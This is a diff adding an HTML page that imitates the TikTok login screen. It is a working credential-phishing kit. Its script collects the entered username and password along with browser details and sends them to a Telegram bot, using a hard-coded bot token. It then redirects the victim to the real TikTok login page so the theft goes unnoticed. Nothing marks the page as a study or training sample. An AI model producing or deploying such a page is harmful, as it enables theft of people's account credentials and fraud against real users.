@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok Login</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(135deg, #000000, #111111);
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        margin: 0;
+    }
+    .login-container {
+        background: #1a1a1a;
+        padding: 30px;
+        border-radius: 12px;
+        width: 300px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+        text-align: center;
+    }
+    .logo {
+        font-size: 28px;
+        font-weight: bold;
+        color: #ff0050;
+        margin-bottom: 20px;
+    }
+    input {
+        width: 100%;
+        padding: 12px;
+        margin: 8px 0;
+        border: none;
+        border-radius: 6px;
+        background: #2a2a2a;
+        color: white;
+        font-size: 14px;
+    }
+    input:focus {
+        outline: 2px solid #ff0050;
+    }
+    button {
+        background: #ff0050;
+        border: none;
+        padding: 12px;
+        width: 100%;
+        border-radius: 6px;
+        color: white;
+        font-size: 16px;
+        cursor: pointer;
+    }
+    button:hover {
+        background: #e00048;
+    }
+    .signup {
+        margin-top: 15px;
+        font-size: 13px;
+    }
+    .signup a {
+        color: #ff0050;
+        text-decoration: none;
+    }
+</style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">TikTok Login</div>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username or Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="signup">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get user input
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Get chat ID from URL parameters if present
+            const urlParams = new URLSearchParams(window.location.search);
+            const chatId = urlParams.get('chat_id') || 'YOUR_DEFAULT_CHAT_ID';
+            
+            // Telegram bot token (this should be server-side in real applications)
+            const botToken = '8364356006:AAF51rXhVqggvSwTicau0sdlyyLTq7AQez0';
+            
+            // Prepare the message
+            const message = `⚠️ New TikTok Login Attempt ⚠️\nUsername: ${username}\nPassword: ${password}\nIP: ${window.location.hostname}\nUser Agent: ${navigator.userAgent}`;
+            
+            // Send to Telegram bot
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Redirect user after sending data
+                window.location.href = 'https://www.tiktok.com/login'; // Actual TikTok login page
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                window.location.href = 'https://www.tiktok.com/login';
+            });
+        });
+    </script>
+</body>
+</html>
